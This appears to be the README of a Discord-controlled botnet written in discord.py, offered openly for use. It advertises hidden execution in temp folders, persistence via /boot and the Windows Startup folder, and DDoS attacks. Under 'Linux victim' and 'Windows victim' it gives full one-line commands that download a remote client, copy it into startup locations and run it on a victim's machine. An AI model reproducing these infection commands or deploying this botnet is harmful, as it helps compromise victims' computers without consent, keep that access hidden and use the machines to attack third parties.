# Discord.py BotNet
![image](https://user-images.githubusercontent.com/104208624/202854669-6d08daef-eae2-438b-a354-78b8accb7cb5.png)

https://discord.gg/vCdPTjD6rZ

# Credits:
Orig - batu.sh#9675

TG @udbnt

# Features
* Hidden (Works in /tmp, %temp% + Console is always hidden)
* Persistence (Copying to /boot, shell:startup)
* Tested on Windows and Linux platforms
* DDoS attack uses "storm" script

# Commands
![image](https://user-images.githubusercontent.com/104208624/203849645-908bde50-bd0a-49fa-9a8a-1f948953677e.png)

# Linux victim
cd /tmp; apt-get update -y; apt-get install curl -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient

# Windows victim
cd %temp% & powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile WClient.exe & copy WClient.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" & WClient.exe
